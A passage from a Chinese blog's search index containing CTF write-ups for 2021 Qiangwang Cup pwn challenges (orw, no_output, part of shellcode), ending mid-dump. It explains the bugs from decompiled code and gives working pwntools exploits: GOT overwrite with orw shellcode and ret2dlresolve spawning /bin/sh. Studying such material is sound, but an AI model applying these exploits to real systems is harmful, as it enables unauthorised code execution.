<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021强网杯pwn复现</title>
      <link href="/2021/10/09/2021%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/10/09/2021%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2021强网杯"><a href="#2021强网杯" class="headerlink" title="2021强网杯"></a>2021强网杯</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><ul><li>参考链接：<a href="https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/">https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/</a></li></ul><h3 id="强网先锋-orw"><a href="#强网先锋-orw" class="headerlink" title="[强网先锋]orw"></a>[强网先锋]orw</h3><ul><li>查看程序，基本全是7的权限，所以说shellcode往哪里写都可以：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ checksec pwn</span><br><span class="line">[*] &#x27;/home/secc/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><ul><li>临时修改共享库可以使用如下命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=/home/secc/Desktop/libseccomp.so.0</span><br></pre></td></tr></table></figure><ul><li>查看沙盒，发现限制了只能使用<code>open</code>、<code>read</code>、<code>write</code>函数，这道题应该是个orw：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ seccomp-tools dump ./pwn</span><br><span class="line">..#######..##......##.########.</span><br><span class="line">.##.....##.##..##..##.##.....##</span><br><span class="line">.##.....##.##..##..##.##.....##</span><br><span class="line">.##.....##.##..##..##.########.</span><br><span class="line">.##..##.##.##..##..##.##.....##</span><br><span class="line">.##....##..##..##..##.##.....##</span><br><span class="line">..#####.##..###..###..########.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">It&#x27;s easy .Just hack for fun~!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><ul><li>反编译程序，是一道菜单题，只有add和free两个函数。首先来看看函数，这里没有限制索引为负数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_E44</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( qword_202130 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    v1 = sub_DFA();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    v2 = sub_DFA();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">8</span> &amp;&amp; v1 &lt;= <span class="number">1</span> )<span class="comment">// 只限制了索引小于1，存在数组越界</span></span><br><span class="line">    &#123;</span><br><span class="line">      qword_2020E0[v1] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">      <span class="keyword">if</span> ( !qword_2020E0[v1] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">      sub_D8E(qword_2020E0[v1], v2);</span><br><span class="line">      ++qword_202130;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> qword_202130;</span><br></pre></td></tr></table></figure><ul><li>free函数比较正常：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_F8E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  result = qword_202138;</span><br><span class="line">  <span class="keyword">if</span> ( qword_202138 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    v1 = sub_DFA();</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_2020E0[v1]);</span><br><span class="line">    qword_2020E0[v1] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">return</span> ++qword_202138;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>myread函数，存在任意长度写：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_D8E</span><span class="params">(_BYTE *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buf = a1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);<span class="comment">// 首先读入一个字节，让v4加1，此时v4已经等于1了</span></span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++buf == &amp;a1[a2] )</span><br><span class="line">      <span class="keyword">return</span> v4;<span class="comment">// 如果伪造v4为0的话，这里的判断永远不会成立，所以存在任意长度写</span></span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>思路：</p><ul><li>使用负索引，可以修改got表。</li><li>往got表的libc地址内写入shellcode，最后触发执行。</li></ul></li><li><p>脚本：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;39.105.131.68&#x27;</span>,<span class="number">12354</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">mov rdi, 0x67616c662f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">mov rsi, rdi</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;-25&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;init-pwndbg\nb *$rebase(0x0000E90)&#x27;)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>) <span class="comment"># 填0也可以</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><ul><li>另一种思路：<ul><li>改写atoi为<code>jmp rdi</code>，这样就可以利用atoi的缓冲区写入shellcode。</li><li>通过16字节的shellcode写入更大的shellcode，完成orw。且可以后一个shellcode可以读入栈中，使用rbp寄存器。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">cho</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice &gt;&gt;&#x27;</span>, <span class="built_in">str</span>(cho))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">   choice(<span class="number">1</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">4</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov dl, 0x80</span></span><br><span class="line"><span class="string">mov rsi, rbp</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rbp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">8</span>, <span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line">add(-<span class="number">14</span>, <span class="number">8</span>, asm(<span class="string">&#x27;jmp rdi&#x27;</span>)) <span class="comment"># atoi</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.pushstr(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;rsp&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="强网先锋-no-output"><a href="#强网先锋-no-output" class="headerlink" title="[强网先锋]no_output"></a>[强网先锋]no_output</h3><ul><li>使用IDA反编译程序：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8049424</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">48</span>]; <span class="comment">// [esp+2Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_804930B();</span><br><span class="line">  v3 = <span class="string">&quot;tell me some thing&quot;</span>;</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>u);</span><br><span class="line">  v3 = <span class="string">&quot;Tell me your name:\n&quot;</span>;</span><br><span class="line">  read(<span class="number">0</span>, src, <span class="number">0x20</span>u);</span><br><span class="line">  sub_80493EC(src);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  v3 = <span class="string">&quot;now give you the flag\n&quot;</span>;</span><br><span class="line">  read(unk_804C080, src, <span class="number">0x10</span>u);<span class="comment">// 读取本地文件中的字符串</span></span><br><span class="line">  result = sub_8049385(src, off_804C034);<span class="comment">// 字符串比较，off_804C034为hello_boy</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> sub_8049269();<span class="comment">// 比较成功后进入函数</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>看一下<code>sub_804930B</code>初始化函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804930B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  result = open(<span class="string">&quot;real_flag.txt&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  unk_804C080 = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>来看到<code>sub_8049269</code>函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">__sighandler_t</span> <span class="title">sub_8049269</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__sighandler_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> (*v1)(<span class="keyword">int</span>); <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v2[<span class="number">2</span>]; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="string">&quot;give me the soul:&quot;</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">  v3 = <span class="string">&quot;give me the egg:&quot;</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  result = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    signal(<span class="number">8</span>, (<span class="keyword">__sighandler_t</span>)sub_8049236);<span class="comment">// set handler，SIGFPE表示一个算数运算异常</span></span><br><span class="line">    v2[<span class="number">1</span>] = v2[<span class="number">0</span>] / (<span class="keyword">int</span>)v1;<span class="comment">// sub_8049236为漏洞函数</span></span><br><span class="line">    <span class="keyword">return</span> signal(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>学习一下<code>signal</code>函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sighandler_t signal(int signum, sighandler_t handler);</span><br></pre></td></tr></table></figure><ul><li><p>参数<code>signum</code>指明了所要处理的信号类型，它可以取除了SIGKILL和SIGSTOP外的任何一种信号。</p><ul><li>题目中SIGFPE即常量8，为数学相关的异常，如被0除，浮点溢出，等等。</li></ul></li><li><p>看到<code>sub_8049236</code>漏洞函数，这里就是简单的栈溢出了：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8049236</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>思路：</p><ul><li>由于存在<code>strcpy(dest, src);</code>该函数存在1位的溢出，会在拷贝的最后一位后加上<code>\x00</code>，且刚好看到读入的fd指针就在<code>dest</code>全局变量的后面。那么我们可以通过这一位的溢出，将fd指针修改为<code>\x00</code>，那么<code>read</code>函数也就变成了读入输入的字符，那么我们就可以控制<code>src</code>了。</li><li>触发算数运算异常才能运行后门函数，但是<code>if (v1)</code>限制了<code>v1</code>不能为0，那么我们就来构造溢出，我们输入比<code>-2147483648</code>更小的数，由于<code>scanf</code>函数的特性，最终都是识别成<code>0x80000000</code>。输入<code>v1</code>为<code>-1</code>，$-2147483648\div-1=2147483648$，但是<code>2147483648</code>超出了符号int数的大小范围，会导致算数运算异常。</li><li><code>sub_8049236</code>函数内是简单的堆溢出，由于本题中没有输出，所以使用dl_runtime_resolve攻击。</li></ul></li><li><p>形成脚本（ret2dlresolve的思路大致理清楚了，后面再学）：</p><ul><li>注意<code>read</code>函数取消输入不仅可以通过换行字符，也可以通过时间停滞。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>) <span class="comment"># raw_input(&#x27;&gt;&#x27;)</span></span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;hello_boy\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="built_in">str</span>(-<span class="number">0x80000000</span>))</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol = <span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&#x27;/bin/sh&#x27;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"></span><br><span class="line">info(rop.dump())</span><br><span class="line"></span><br><span class="line">sh.sendline(fit(&#123;<span class="number">0x4C</span>: rop.chain(), <span class="number">0x100</span>: dlresolve.payload&#125;))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="强网先锋-shellcode"><a href="#强网先锋-shellcode" class="headerlink" title="[强网先锋]shellcode"></a>[强网先锋]shellcode</h3><ul><li><p>参考链接：<a href="https://www.cnblogs.com/countfatcode/p/11756258.html">https://www.cnblogs.com/countfatcode/p/11756258.html</a><br><a href="https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/">https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/</a><br><a href="https://lingze.xyz/pages/07df2e/">https://lingze.xyz/pages/07df2e/</a></p></li><li><p>查看沙盒：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">secc@ubuntu:~/Desktop$ seccomp-tools dump ./shellcode</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 